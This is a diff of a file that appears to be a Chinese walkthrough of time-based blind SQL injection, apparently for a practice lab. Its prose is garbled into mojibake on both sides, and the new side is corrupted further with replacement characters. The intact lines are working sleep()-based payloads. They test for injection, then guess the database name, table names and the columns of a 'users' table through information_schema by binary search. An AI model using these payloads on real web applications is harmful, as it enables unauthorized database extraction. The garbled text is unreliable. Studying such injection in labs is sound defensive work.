@@ -1,39 +1,39 @@
-1.ÅÐ¶ÏÊÇ·ñ´æÔÚ×¢Èë£¬×¢ÈëÊÇ×Ö·ûÐÍ»¹ÊÇÊý×ÖÐÍ
-ÊäÈë1' and sleep(5) #£¬¸Ð¾õµ½Ã÷ÏÔÑÓ³Ù£»
-ÊäÈë1 and sleep(5) #£¬Ã»ÓÐÑÓ³Ù£»
-ËµÃ÷´æÔÚ×Ö·ûÐÍµÄ»ùÓÚÊ±¼äµÄÃ¤×¢¡£
-2.²Â½âµ±Ç°Êý¾Ý¿âÃû
-Ê×ÏÈ²Â½âÊý¾ÝÃûµÄ³¤¶È¡£
-1' and if(length(database())=1,sleep(5),1) # Ã»ÓÐÑÓ³Ù
-1' and if(length(database())=2,sleep(5),1) # Ã»ÓÐÑÓ³Ù
-1' and if(length(database())=3,sleep(5),1) # Ã»ÓÐÑÓ³Ù
-1' and if(length(database())=4,sleep(5),1) # Ã÷ÏÔÑÓ³Ù
-ËµÃ÷Êý¾Ý¿âÃû³¤¶ÈÎª4¸ö×Ö·û¡£½Ó×Å²ÉÓÃ¶þ·Ö·¨²Â½âÊý¾Ý¿âÃû¡£
-1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)# Ã÷ÏÔÑÓ³Ù
-¡­
-1' and if(ascii(substr(database(),1,1))<100,sleep(5),1)# Ã»ÓÐÑÓ³Ù
-1' and if(ascii(substr(database(),1,1))>100,sleep(5),1)# Ã»ÓÐÑÓ³Ù
-ËµÃ÷Êý¾Ý¿âÃûµÄµÚÒ»¸ö×Ö·ûÎªÐ¡Ð´×ÖÄ¸d¡£
-¡­
-ÖØ¸´ÉÏÊö²½Öè£¬¼´¿É²Â½â³öÊý¾Ý¿âÃû¡£
-3.²Â½âÊý¾Ý¿âÖÐµÄ±íÃû
-Ê×ÏÈ²Â½âÊý¾Ý¿âÖÐ±íµÄÊýÁ¿¡£
-1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# Ã»ÓÐÑÓ³Ù
-1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# Ã÷ÏÔÑÓ³Ù
-ËµÃ÷Êý¾Ý¿âÖÐÓÐÁ½¸ö±í¡£½Ó×Å°¤¸ö²Â½â±íÃû¡£
-1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # Ã»ÓÐÑÓ³Ù
-¡­
-1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # Ã÷ÏÔÑÓ³Ù
-ËµÃ÷µÚÒ»¸ö±íÃûµÄ³¤¶ÈÎª9¸ö×Ö·û¡£²ÉÓÃ¶þ·Ö·¨¼´¿É²Â½â³ö±íÃû¡£
-4.²Â½â±íÖÐµÄ×Ö¶ÎÃû
-Ê×ÏÈ²Â½â±íÖÐ×Ö¶ÎµÄÊýÁ¿¡£
-1' and if((select count(column_name) from information_schema.columns where table_name= ¡¯users¡¯)=1,sleep(5),1)# Ã»ÓÐÑÓ³Ù
-¡­
-1' and if((select count(column_name) from information_schema.columns where table_name= ¡¯users¡¯)=8,sleep(5),1)# Ã÷ÏÔÑÓ³Ù
-ËµÃ÷users±íÖÐÓÐ8¸ö×Ö¶Î¡£½Ó×Å°¤¸ö²Â½â×Ö¶ÎÃû¡£
-1' and if(length(substr((select column_name from information_schema.columns where table_name= ¡¯users¡¯ limit 0,1),1))=1,sleep(5),1) # Ã»ÓÐÑÓ³Ù
-¡­
-1' and if(length(substr((select column_name from information_schema.columns where table_name= ¡¯users¡¯ limit 0,1),1))=7,sleep(5),1) # Ã÷ÏÔÑÓ³Ù
-ËµÃ÷users±íµÄµÚÒ»¸ö×Ö¶Î³¤¶ÈÎª7¸ö×Ö·û¡£²ÉÓÃ¶þ·Ö·¨¼´¿É²Â½â³ö¸÷¸ö×Ö¶ÎÃû¡£
-5.²Â½âÊý¾Ý
-Í¬Ñù²ÉÓÃ¶þ·Ö·¨¡£
+1.ï¿½Ð¶ï¿½ï¿½Ç·ï¿½ï¿½ï¿½ï¿½×¢ï¿½ë£¬×¢ï¿½ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½Í»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+ï¿½ï¿½ï¿½ï¿½1' and sleep(5) #ï¿½ï¿½ï¿½Ð¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó³Ù£ï¿½
+ï¿½ï¿½ï¿½ï¿½1 and sleep(5) #ï¿½ï¿½Ã»ï¿½ï¿½ï¿½Ó³Ù£ï¿½
+Ëµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ÍµÄ»ï¿½ï¿½ï¿½Ê±ï¿½ï¿½ï¿½Ã¤×¢ï¿½ï¿½
+2.ï¿½Â½âµ±Ç°ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½
+ï¿½ï¿½ï¿½È²Â½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä³ï¿½ï¿½È¡ï¿½
+1' and if(length(database())=1,sleep(5),1) # Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+1' and if(length(database())=2,sleep(5),1) # Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+1' and if(length(database())=3,sleep(5),1) # Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+1' and if(length(database())=4,sleep(5),1) # ï¿½ï¿½ï¿½ï¿½ï¿½Ó³ï¿½
+Ëµï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Îª4ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Å²ï¿½ï¿½Ã¶ï¿½ï¿½Ö·ï¿½ï¿½Â½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½
+1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)# ï¿½ï¿½ï¿½ï¿½ï¿½Ó³ï¿½
+ï¿½ï¿½
+1' and if(ascii(substr(database(),1,1))<100,sleep(5),1)# Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+1' and if(ascii(substr(database(),1,1))>100,sleep(5),1)# Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+Ëµï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½Äµï¿½Ò»ï¿½ï¿½ï¿½Ö·ï¿½ÎªÐ¡Ð´ï¿½ï¿½Ä¸dï¿½ï¿½
+ï¿½ï¿½
+ï¿½Ø¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½è£¬ï¿½ï¿½ï¿½É²Â½ï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½
+3.ï¿½Â½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ÐµÄ±ï¿½ï¿½ï¿½
+ï¿½ï¿½ï¿½È²Â½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½Ð±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# ï¿½ï¿½ï¿½ï¿½ï¿½Ó³ï¿½
+Ëµï¿½ï¿½ï¿½ï¿½ï¿½Ý¿ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Å°ï¿½ï¿½ï¿½ï¿½Â½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+ï¿½ï¿½
+1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # ï¿½ï¿½ï¿½ï¿½ï¿½Ó³ï¿½
+Ëµï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä³ï¿½ï¿½ï¿½Îª9ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã¶ï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½É²Â½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+4.ï¿½Â½ï¿½ï¿½ï¿½Ðµï¿½ï¿½Ö¶ï¿½ï¿½ï¿½
+ï¿½ï¿½ï¿½È²Â½ï¿½ï¿½ï¿½ï¿½ï¿½Ö¶Îµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+1' and if((select count(column_name) from information_schema.columns where table_name= ï¿½ï¿½usersï¿½ï¿½)=1,sleep(5),1)# Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+ï¿½ï¿½
+1' and if((select count(column_name) from information_schema.columns where table_name= ï¿½ï¿½usersï¿½ï¿½)=8,sleep(5),1)# ï¿½ï¿½ï¿½ï¿½ï¿½Ó³ï¿½
+Ëµï¿½ï¿½usersï¿½ï¿½ï¿½ï¿½ï¿½ï¿½8ï¿½ï¿½ï¿½Ö¶Î¡ï¿½ï¿½ï¿½ï¿½Å°ï¿½ï¿½ï¿½ï¿½Â½ï¿½ï¿½Ö¶ï¿½ï¿½ï¿½ï¿½ï¿½
+1' and if(length(substr((select column_name from information_schema.columns where table_name= ï¿½ï¿½usersï¿½ï¿½ limit 0,1),1))=1,sleep(5),1) # Ã»ï¿½ï¿½ï¿½Ó³ï¿½
+ï¿½ï¿½
+1' and if(length(substr((select column_name from information_schema.columns where table_name= ï¿½ï¿½usersï¿½ï¿½ limit 0,1),1))=7,sleep(5),1) # ï¿½ï¿½ï¿½ï¿½ï¿½Ó³ï¿½
+Ëµï¿½ï¿½usersï¿½ï¿½ï¿½Äµï¿½Ò»ï¿½ï¿½ï¿½Ö¶Î³ï¿½ï¿½ï¿½Îª7ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã¶ï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½É²Â½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö¶ï¿½ï¿½ï¿½ï¿½ï¿½
+5.ï¿½Â½ï¿½ï¿½ï¿½ï¿½ï¿½
+Í¬ï¿½ï¿½ï¿½ï¿½ï¿½Ã¶ï¿½ï¿½Ö·ï¿½ï¿½ï¿½
